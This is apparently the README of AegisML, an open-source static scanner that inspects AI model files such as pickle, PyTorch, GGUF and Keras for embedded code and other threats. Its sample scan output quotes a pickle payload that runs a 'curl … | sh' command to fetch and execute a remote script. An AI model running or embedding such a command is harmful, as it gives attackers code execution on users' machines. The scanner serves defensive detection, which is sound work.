<div align="center">

# AegisML

**Static security analysis for AI model artifacts.**
No execution. No unpickling. No extraction. No network.

`pip install aegisml-scanner` → `aegisml scan model.safetensors`

[![CI](https://github.com/hasanalaaa/aegisml/actions/workflows/ci.yml/badge.svg)](https://github.com/hasanalaaa/aegisml/actions/workflows/ci.yml)
![engine](https://img.shields.io/badge/engine-3.0.0-5b8cff)
![deps](https://img.shields.io/badge/runtime%20dependencies-0-22c55e)
![license](https://img.shields.io/badge/license-MIT-8e9bb5)

</div>

> [!IMPORTANT]
> The distribution is **`aegisml-scanner`**, the import package is
> **`aegisml_scanner`**, and the command is **`aegisml`**. Do not run
> `pip install aegisml` — that PyPI name belongs to an unrelated project.

---

## What it is

A model file is not data. A `.pt` is a Python program, a `.h5` can carry marshalled
bytecode, a `.gguf` ships a template the runtime renders, and a `config.json` can
authorise the loader to import code from the repository. AegisML reads all of that
**without running any of it**, and reports exactly what it found and where.

```
$ aegisml scan pytorch_model.bin

 CRITICAL   pytorch_model.bin

  risk        100/100 (critical)
  format      pytorch
  size        1.3 GiB   read 1.3 GiB @ 91.4 MiB/s
  sha256      9f2c…a7b1
  findings    critical=3  high=2  low=1
  coverage    byte_scan=full, sha256=full, entropy=sampled, signatures=full,
              format_specific=complete, strings=text-regions, depth=full

  findings
  [CRITICAL] AML.PICKLE.EXEC_CALL @1,204 in archive/data.pkl
           Pickle reconstructs the call posix.system('curl http://…/s.sh | sh')
           at byte 1204; loading the artifact runs it.
           fix: Quarantine the artifact and report the source repository.
```

The finding names the **callable, its arguments, the byte offset and the archive
member**. That is the difference between "this file contains a REDUCE opcode" and
an actionable report.

---

## Install

```bash
pip install aegisml-scanner          # zero runtime dependencies, pure standard library
pipx install aegisml-scanner         # isolated global command
```

Python 3.10+. Fully offline; nothing is uploaded anywhere unless you explicitly
pass an API URL.

---

## Use it

```bash
aegisml scan model.safetensors                        # one artifact
aegisml scan ./my-model-repo --jobs 8                 # a whole repository, in parallel
aegisml scan huge.gguf --signatures full -j 0         # every byte vs every signature
aegisml scan ./repo --format sarif -o out.sarif       # GitHub code scanning
aegisml scan ./repo --format html  -o report.html     # standalone shareable report
aegisml serve                                         # local web UI on 127.0.0.1:8765
aegisml verify ./repo -m manifest.json --create       # pin the bytes
aegisml verify ./repo -m manifest.json                # detect drift later
aegisml rules --severity critical                     # the detection catalogue
aegisml explain AML.GGUF.CHAT_TEMPLATE_SSTI           # one rule in full
aegisml doctor --json                                 # environment readiness
```

**Exit codes** — `0` clean · `1` policy violation (`--fail-on`) · `2` operational
failure or incomplete coverage. An incomplete scan is *never* reported as safe.

### Local web interface

```bash
aegisml serve --root ~/models
```

A local page (loopback only, strict CSP, no external requests) with drag-and-drop
scanning, repository browsing and the full evidence view. It runs the same engine
as the CLI — the hosted site is a convenience, not the product.

### GitHub Action

```yaml
- uses: hasanalaaa/aegisml@v3
  with:
    model-path: models/
    fail-on: high
    signatures: full
```

---

## What it actually checks

| Format | Structural analysis | Representative detections |
|---|---|---|
| **Pickle** (`.pkl`, `.joblib`, protocols 0–5) | symbolic opcode VM, call-graph reconstruction, memo/`STACK_GLOBAL` resolution | `os.system` / `eval` / gadget chains **with their arguments**, extension registry, concatenated streams, trailing data |
| **PyTorch** (`.pt`, `.pth`, `.bin`, `.ckpt`) | ZIP directory + every embedded pickle + TorchScript `code/` | RCE pickles, arbitrary Python shipped inside the weights file, native members |
| **SafeTensors** | exact tensor-directory validation | overlapping tensors, out-of-bounds offsets, dtype/shape mismatch, **unclaimed slack used as a hiding place** |
| **GGUF** | streaming metadata + tensor directory, bounded | Jinja SSTI in `chat_template` (CVE-2024-34359), duplicate keys, misaligned/OOB tensors, non-zero padding |
| **Keras** (`.h5`, `.keras`) | model-configuration walk | `Lambda` layers, **base64-marshalled Python bytecode**, custom objects (CVE-2024-3660, CVE-2025-1550, CVE-2025-9905) |
| **ONNX** | schema-free protobuf decode | `PythonOp`, non-standard operator domains, `external_data` paths escaping the model directory |
| **TensorFlow SavedModel** | GraphDef symbol extraction | `PyFunc`, `EagerPyFunc`, `ReadFile` / `WriteFile` |
| **TFLite** | FlatBuffer root and operator table | custom operators backed by native delegates |
| **NumPy** (`.npy`, `.npz`) | header literal parse | object dtype re-enabling Pickle — and the embedded pickle itself |
| **Archives** (zip, tar, gzip) | member walk, recursion to depth 4 | zip-slip, symlink and device members, setuid bits, decompression bombs, duplicate entries, nested archives |
| **Repository files** | `ast` parse (never imported) | `auto_map` / `trust_remote_code`, import-time side effects, dangerous calls, direct-URL and index-override dependencies |
| **Any format** | full-byte evidence | 65 rules / 327 signatures: secret material, C2 endpoints, embedded ELF/PE/Mach-O, shellcode, prompt injection |

### Weight-level forensics

Structural validity does not prove the numbers are clean. Every tensor region is
sampled under a fixed budget for:

- **text in a numeric region** — a printable run inside float weights is a script, not a weight;
- **NaN / Inf payloads** — counted with bit arithmetic, no float objects materialised;
- **all-zero tensors** — a silently disabled layer or a truncated export;
- **LSB channels** — a chi-square test on the mantissa's low bit, the classic steganography carrier.

Findings resolve to the **tensor name** they fall inside, not just a byte offset.

---

## Built for terabyte models

```bash
aegisml scan 1TB-model.gguf --jobs 0 --progress
```

- **Constant memory.** Every pass is streaming; peak RSS is flat from 1 MiB upward
  (measured ~127 MB on a 256 MiB artifact and unchanged above it).
- **One sequential read.** Hashes, signatures, string harvesting and the byte
  profile share a single pass.
- **Two honest tiers.** `full` checks every byte against every signature.
  `adaptive` (default above 2 GiB) still hashes, profiles and magic-scans every
  byte, and runs the full signature set over all structural regions, all nested
  payloads and every block containing a printable run — with the tier recorded in
  the report's coverage block.
- **Parallel segments.** `--jobs N` splits the file into overlapping segments across
  processes while SHA-256 runs in a background thread (`hashlib` releases the GIL),
  so hashing overlaps with scanning instead of competing with it. A match that
  straddles a cut is reported once, at its true absolute offset.

Nothing is ever loaded whole: the largest allocation is one chunk (8 MiB by default).

---

## Self-hosting the service and UI

The scanner is the product; the service is optional.

```bash
docker compose up            # API + worker + web; SQLite by default, Redis optional
```

The FastAPI service in `services/scan-engine` calls **the same engine**, stores
results in SQLite or PostgreSQL, and exposes `/api/v1/scan/file`, `/api/v1/scan/url`
and the report endpoints. The Next.js app in `apps/web` renders the report,
including the evidence panel (structure, coverage, nested payloads, tensor
sampling). Scans are private by default and BYOK keys are never persisted or queued.

---

## Extending detection

Rules are data. Ship your own without forking:

```json
{
  "rules": [{
    "id": "ORG.CANARY.INTERNAL",
    "severity": "critical",
    "category": "custom",
    "cvss": 9.0,
    "description": "Internal canary token found in a published artifact.",
    "remediation": "Treat the artifact as leaked; rotate the token.",
    "patterns": ["ACME-INTERNAL-ONLY", "hex:deadbeefcafe"]
  }]
}
```

```bash
aegisml scan model.bin --rules org-pack.json
```

Patterns are literal (case-insensitive; `hex:` for raw bytes) or `regex`, evaluated
against harvested strings. Every rule carries severity, CVSS, category, MITRE
ATLAS/ATT&CK technique, CWE and remediation, and appears in `aegisml rules --json`.

---

## Python API

```python
from aegisml_scanner import AegisML

engine = AegisML(signatures="full", jobs=8)
result = engine.scan("pytorch_model.bin")

print(result.verdict, result.risk_score)          # CRITICAL 100.0
for threat in result.threats:
    print(threat.id, threat.region, threat.byte_offsets[:3], threat.description)

results, cross_file = engine.scan_repository("./my-model-repo")
```

`scan_bytes(name, data)` runs the same engine on an in-memory artifact.

---

## Honest limits

- **Static analysis cannot prove behavioural safety.** A backdoor encoded purely in
  weight values — a trigger phrase that flips an output — leaves no structural or
  statistical trace that this or any static scanner can reliably detect. AegisML
  reports what is provable from the bytes, and says so.
- **Coverage is reported, never assumed.** If a parser hits a safety limit, a read is
  short, or the file changes mid-scan, the result is marked incomplete, exits `2`,
  and issues no safety verdict.
- **The adaptive tier is a documented trade**, not a hidden shortcut: a bare
  signature surrounded by high-entropy bytes with no printable run of 24+ bytes
  nearby is only caught by `--signatures full`. Use `full` (with `--jobs`) when the
  artifact is untrusted and the time budget allows.
- **Entropy is evidence, not a verdict.** Quantized weights are legitimately
  high-entropy; AegisML never raises a finding on entropy alone.
- **The hosted API caps uploads at 100 GiB.** Terabyte artifacts belong on the local
  CLI path.

---

## Development

```bash
python -m pytest                     # full suite, adversarial corpus included
python -m aegisml_scanner rules      # detection catalogue
python tests/corpus.py /tmp/corpus   # generate the malicious sample set
```

`tests/corpus.py` builds one deliberately malicious artifact per supported vector
from the standard library alone — no checked-in binaries, no third-party model
libraries. Each test asserts a **named rule id**, so a regression is a specific,
fixable gap rather than a moved number.

See [`docs/DEVELOPMENT_PLAN_V3.md`](docs/DEVELOPMENT_PLAN_V3.md) for the architecture
and evidence log, [`SECURITY.md`](SECURITY.md) for disclosure, and
[`CONTRIBUTING.md`](CONTRIBUTING.md) to add a rule or a format parser.

MIT licensed.
